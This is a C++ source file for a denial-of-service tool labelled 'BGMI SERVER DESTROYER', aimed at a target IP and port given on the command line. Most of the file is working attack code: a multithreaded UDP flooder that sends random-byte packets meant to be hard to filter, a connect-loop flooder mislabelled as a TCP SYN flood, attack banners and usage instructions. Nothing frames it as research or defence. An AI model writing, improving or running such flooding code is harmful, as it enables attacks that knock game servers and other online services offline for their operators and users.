// bgmi_beast_fixed.cpp
// Compile: g++ -O3 -pthread -std=c++11 -o bgmi_beast bgmi_beast_fixed.cpp
// Usage: ./bgmi_beast <TARGET_IP> <PORT> <DURATION_SEC> [THREADS] [METHOD]

#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <cstring>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>      // ← NEEDED for fcntl()

// ============================================================
// CONFIGURATION
// ============================================================
#define DEFAULT_THREADS 8
#define PKT_MIN_SIZE 64
#define PKT_MAX_SIZE 1400
#define STATS_INTERVAL_MS 2000

std::atomic<bool> running(true);
std::atomic<long long> total_packets(0);

// ============================================================
// UDP FLOOD ENGINE - FIXED: Each thread gets its OWN socket
// ============================================================
class UDPFlooder {
private:
    const char* target_ip;
    int target_port;
    
public:
    UDPFlooder(const char* ip, int port) : target_ip(ip), target_port(port) {}
    
    void flood(int duration_sec, int thread_id) {
        // Create socket INSIDE the thread (each thread gets its own)
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            std::cerr << "[Thread " << thread_id << "] Socket creation failed" << std::endl;
            return;
        }
        
        // Increase send buffer for maximum throughput
        int buf_size = 1024 * 1024; // 1MB
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        
        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
        
        // Random generator setup (per thread for no contention)
        std::random_device rd;
        std::mt19937 rng(rd());
        std::uniform_int_distribution<int> size_dist(PKT_MIN_SIZE, PKT_MAX_SIZE);
        std::uniform_int_distribution<int> byte_dist(0, 255);
        
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_sec);
        long long packet_count = 0;
        
        // Pre-allocate buffer
        std::vector<char> buffer(PKT_MAX_SIZE);
        
        while (running && std::chrono::steady_clock::now() < end_time) {
            // Random payload size
            int pkt_size = size_dist(rng);
            
            // Fill with random bytes (harder to filter)
            for (int i = 0; i < pkt_size; i++) {
                buffer[i] = static_cast<char>(byte_dist(rng));
            }
            
            // Send packet
            int ret = sendto(sock, buffer.data(), pkt_size, 0,
                             (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (ret > 0) {
                packet_count++;
            }
        }
        
        total_packets += packet_count;
        close(sock);  // Each thread closes its OWN socket
        
        std::cout << "[Thread " << thread_id << "] Finished. Packets: " << packet_count << std::endl;
    }
};

// ============================================================
// TCP SYN FLOOD - FIXED: Each thread gets its OWN socket
// ============================================================
class TCPFlooder {
private:
    const char* target_ip;
    int target_port;
    
public:
    TCPFlooder(const char* ip, int port) : target_ip(ip), target_port(port) {}
    
    void flood(int duration_sec, int thread_id) {
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_sec);
        long long packet_count = 0;
        
        while (running && std::chrono::steady_clock::now() < end_time) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target_port);
            inet_pton(AF_INET, target_ip, &addr.sin_addr);
            
            // Non-blocking connect for speed
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            connect(sock, (struct sockaddr*)&addr, sizeof(addr));
            
            packet_count++;
            close(sock);
        }
        
        total_packets += packet_count;
        std::cout << "[Thread " << thread_id << "] Finished. Packets: " << packet_count << std::endl;
    }
};

// ============================================================
// STATISTICS DISPLAY THREAD
// ============================================================
void stats_printer(int duration) {
    int elapsed = 0;
    long long last_packets = 0;
    
    while (running && elapsed < duration) {
        std::this_thread::sleep_for(std::chrono::milliseconds(STATS_INTERVAL_MS));
        elapsed += STATS_INTERVAL_MS / 1000;
        
        long long current = total_packets.load();
        long long delta = current - last_packets;
        double rate = delta / (STATS_INTERVAL_MS / 1000.0);
        
        std::cout << "💀 Packets sent: " << current 
                  << " | Rate: " << (int)rate << " pps" << std::endl;
        last_packets = current;
    }
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char* argv[]) {
    std::cout << "🔥🔥🔥 BGMI SERVER DESTROYER - FIXED 🔥🔥🔥\n";
    std::cout << "=====================================\n";
    
    if (argc < 4) {
        std::cout << "Usage: " << argv[0] << " <TARGET_IP> <PORT> <DURATION> [THREADS] [METHOD]\n\n";
        std::cout << "  METHOD: udp (default), tcp, both\n";
        std::cout << "  THREADS: number of threads (default: " << DEFAULT_THREADS << ")\n\n";
        std::cout << "Example: " << argv[0] << " 192.168.1.100 8000 60 16 both\n";
        return 1;
    }
    
    const char* target_ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = (argc > 4) ? std::stoi(argv[4]) : DEFAULT_THREADS;
    std::string method = (argc > 5) ? argv[5] : "udp";
    
    std::cout << "🎯 Target: " << target_ip << ":" << port << "\n";
    std::cout << "⏱️  Duration: " << duration << " seconds\n";
    std::cout << "⚡ Threads: " << threads << "\n";
    std::cout << "🔫 Method: " << method << "\n";
    std::cout << "=====================================\n";
    std::cout << "💀 Starting attack...\n\n";
    
    // Ignore SIGPIPE (prevents crash on closed connections)
    signal(SIGPIPE, SIG_IGN);
    
    std::vector<std::thread> attack_threads;
    
    if (method == "udp") {
        UDPFlooder flooder(target_ip, port);
        for (int i = 0; i < threads; i++) {
            attack_threads.emplace_back(&UDPFlooder::flood, &flooder, duration, i);
        }
    } 
    else if (method == "tcp") {
        TCPFlooder flooder(target_ip, port);
        for (int i = 0; i < threads; i++) {
            attack_threads.emplace_back(&TCPFlooder::flood, &flooder, duration, i);
        }
    }
    else if (method == "both") {
        UDPFlooder udp_flooder(target_ip, port);
        TCPFlooder tcp_flooder(target_ip, port);
        int udp_threads = threads / 2;
        int tcp_threads = threads - udp_threads;
        for (int i = 0; i < udp_threads; i++) {
            attack_threads.emplace_back(&UDPFlooder::flood, &udp_flooder, duration, i);
        }
        for (int i = 0; i < tcp_threads; i++) {
            attack_threads.emplace_back(&TCPFlooder::flood, &tcp_flooder, duration, i);
        }
    }
    else {
        std::cerr << "Unknown method. Use udp, tcp, or both.\n";
        return 1;
    }
    
    // Stats thread
    std::thread stats_thread(stats_printer, duration);
    
    // Wait for all attack threads to finish
    for (auto& t : attack_threads) {
        t.join();
    }
    
    running = false;
    stats_thread.join();
    
    std::cout << "\n✅ Attack completed!\n";
    std::cout << "📊 Total packets sent: " << total_packets.load() << "\n";
    std::cout << "🔥🔥🔥 FIXED VERSION - ALL THREADS RAN FULL DURATION 🔥🔥🔥\n";
    
    return 0;
}
